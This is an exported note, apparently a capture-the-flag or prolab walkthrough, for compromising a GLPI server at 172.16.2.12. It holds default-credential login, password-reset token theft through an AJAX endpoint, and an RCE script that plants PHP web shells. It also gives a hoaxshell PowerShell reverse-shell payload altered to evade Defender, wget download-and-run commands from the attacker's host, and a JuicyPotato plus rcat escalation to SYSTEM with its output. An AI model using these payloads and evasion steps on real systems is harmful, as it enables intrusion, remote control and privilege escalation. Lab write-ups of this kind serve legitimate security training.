<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MGMT01 - 172.16.2.12</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MGMT01 - 172.16.2.12</h1><br/><p><a href="Offshore--MGMT01_-_172.16.2.12_28.html#OFS-Flag33">Flag 33</a></p><p><a href="Offshore--MGMT01_-_172.16.2.12_28.html#OFS-Flag34">Flag 34</a></p><p></p><p><a href="https://www.tarlogic.com/blog/glpi-vulnerability-cve-2019-14666/">https://www.tarlogic.com/blog/glpi-vulnerability-cve-2019-14666/</a></p><p></p><p>Trying some default credentials we can get in with normal / normal</p><p></p><p>In the Administration, we can see the users</p><p></p><p><img src="images/28-1.png" alt="images/28-1.png" /></p><p></p><p>We can highjack the glpi_adm account with the email address</p><p></p><p>To do this, we need to have an active forgot password request.  Sign out and go to forgot password.  Put in the request for glpi_adm@offshore.com</p><p></p><p><img src="images/28-2.png" alt="images/28-2.png" /></p><p></p><p>Sign back in with normal / normal</p><p></p><p>Go to create a ticket</p><p></p><p>Turn on Burp intercept and click the drop down for requester</p><p></p><p><img src="images/28-3.png" alt="images/28-3.png" /></p><p></p><p><img src="images/28-4.png" alt="images/28-4.png" /></p><p></p><p>Right click and switch it to a GET request</p><p></p><p><img src="images/28-5.png" alt="images/28-5.png" /></p><p></p><p>Send it to Repeater</p><p></p><p>Change the AJAX URL to get a list of forgot password requests</p><p></p><p><img src="images/28-6.png" alt="images/28-6.png" /></p><p></p><p>/ajax/autocompletion.php?itemtype=User&amp;field=password_forget_token&amp;term=</p><p></p><p><img src="images/28-7.png" alt="images/28-7.png" /></p><p></p><p>c728fa494344d5a6fdd202ed970cdf7a0c92412b</p><p></p><p>Use this token with <a href="http://172.16.2.12/front/lostpassword.php?password_forget_token=c728fa494344d5a6fdd202ed970cdf7a0c92412b">http://172.16.2.12/front/lostpassword.php?password_forget_token=c728fa494344d5a6fdd202ed970cdf7a0c92412b</a></p><p></p><p><img src="images/28-8.png" alt="images/28-8.png" /></p><p></p><p>Reset the password</p><p></p><p>Sign in with the new password</p><p></p><p><img src="images/28-9.png" alt="images/28-9.png" /></p><p></p><p></p><p><table style="display:inline-table"><tr><td><a href="EmbeddedFiles/28-setup_glpi.py">Linked file: setup_glpi.py </a></td></tr></table></p><p></p><p>Use the script above to get RCE</p><p><code><span style="background-color:#000000;">python /home/user/Downloads/setup_glpi.py --url http://172.16.2.12 --user glpi_adm --password password123! --platform Win</span></code></p><p></p><p>It might take a few iterations before you get the RCE Found message</p><p></p><p><code><span style="background-color:#000000;">[+] Logged in</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1821</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/JrPFaEXk.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 13893</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Press any key to continue with the next iteration...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1822</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE12</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE12</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/eGSMaufU.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 13894</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Press any key to continue with the next iteration...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1823</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE123</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE123</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/GZJOVcVS.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 13896</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Press any key to continue with the next iteration...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1824</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE1234</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE1234</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/AYJFiCLe.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 13897</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Press any key to continue with the next iteration...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1825</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE12345</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE12345</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/YhAEhXNw.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 13895</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Press any key to continue with the next iteration...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1826</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE123456</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE123456</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/aTEuDLCf.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 13899</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Press any key to continue with the next iteration...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1827</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE1234567</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE1234567</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/xLyYdNES.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 13900</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Press any key to continue with the next iteration...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Deleting network 1828</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network created</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Name: PoC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      ESSID: RCE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE12345678</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Network mofified</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      New ESSID: RCE12345678</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Shell: http://172.16.2.12/pics/CGsqAUns.php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">      Shell size: 8387</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] RCE FOUND!</span></code></p><p></p><p>Now if we go to that php, we can get RCE</p><p></p><p><a href="http://172.16.2.12/pics/CGsqAUns.php?0=whoami">http://172.16.2.12/pics/CGsqAUns.php?0=whoami</a></p><p></p><p>Our executed code result appears at the bottom</p><p></p><p><img src="images/28-10.png" alt="images/28-10.png" /></p><p></p><p></p><p>Using hoaxshell, create a payload </p><p></p><p><code><span style="background-color:#000000;">./hoaxshell.py -s 10.10.16.113 -p 2222 -r -H &quot;Authorization&quot;</span></code></p><p></p><p>Find the letters IEX and put an apostrophe before and after the E so it&#39;s i&#39;e&#39;x</p><p>This will make Defender not alert</p><p></p><p><code><span style="background-color:#000000;">└─$ cat rev_shell.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$s=&#39;10.10.16.113:2222&#39;;$i=&#39;9e1b048b-40181bca-57c94120&#39;;$p=&#39;http://&#39;;$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/9e1b048b -Headers @{&quot;Authorization&quot;=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/40181bca -Headers @{&quot;Authorization&quot;=$i}).Content;if ($c -ne &#39;None&#39;) {$r=i&#39;e&#39;x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/57c94120 -Method POST -Headers @{&quot;Authorization&quot;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join &#39; &#39;)} sleep 0.8}</span></code></p><p></p><p>Use this command for in RCE to pull the file</p><p><code><span style="background-color:#000000;">powershell wget http://10.10.14.12/rev_shell.ps1 -Outfile payload.ps1</span></code></p><p></p><p>172.16.2.12/pics/CGsqAUns.php?0=powershell wget <a href="http://10.10.16.113/rev_shell.ps1">http://10.10.16.113/rev_shell.ps1</a> -Outfile payload.ps1</p><p></p><p></p><p>List the directory to make sure it didn&#39;t get deleted by Defender</p><p><code><a href="http://172.16.2.12/pics/CGsqAUns.php?0=dir">http://172.16.2.12/pics/CGsqAUns.php?0=dir</a></code></p><p></p><p><code><span style="background-color:#000000;">172.16.2.12/pics/CGsqAUns.php?0=powershell .\payload.ps1</span></code></p><p></p><p>That should get you a rev shell back in hoaxshell</p><p></p><p><img src="images/28-11.png" alt="images/28-11.png" /></p><p></p><p>Use this command to find where our flag.txt is</p><p><code><span style="background-color:#000000;">Get-ChildItem -Path C:\ -Recurse -Filter &quot;flag.txt&quot;</span></code></p><p></p><p><code><span style="background-color:#000000;">PS C:\xampp &gt; type c:\Users\Public\flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag33"></a>OFFSHORE{rc3_fun_w1th_gziP!}</p><p></p><p>Check our user&#39;s privileges</p><p></p><p><code><span style="background-color:#000000;">PS C:\xampp &gt; whoami /priv</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PRIVILEGES INFORMATION</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">----------------------                                                                                                                                                                                                                     </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">                                                                                                                                                                                                                                           </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Privilege Name                Description                               State                                                                                                                                                              </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">============================= ========================================= ========                                                                                                                                                           </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                                                                                                           </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                                                                                                           </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeAuditPrivilege              Generate security audits                  Disabled                                                                                                                                                           </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                            </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                                                                                            </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                                                                            </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled </span></code></p><p></p><p></p><p>We have SeImpersonatePrivilege so let&#39;s try JuicyPotato + RCAT - upload them both with the RCE + powershell wget above.</p><p></p><p>Start the RCAT listener and execute JP + RCAT</p><p></p><p><code><span style="background-color:#000000;">C:\xampp\htdocs\pics\jp.exe -t * -p &quot;c:\windows\system32\cmd.exe&quot; -a &quot;/c C:\xampp\htdocs\pics\rcat.exe connect 10.10.16.113 4444&quot;</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ ./rcat listen 10.10.16.113 4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Listening on 10.10.16.113:4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Connection from 10.10.110.3:50687</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Windows PowerShell </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Copyright (C) Microsoft Corporation. All rights reserved.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\&gt; whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">nt authority\system</span></code></p><p></p><p><code><span style="background-color:#000000;">PS C:\&gt; type c:\users\administrator\desktop\flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">type c:\users\administrator\desktop\flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag34"></a>OFFSHORE{l0ng_liv3_Th3_t@ter!}</p></div>
</body>
</html>
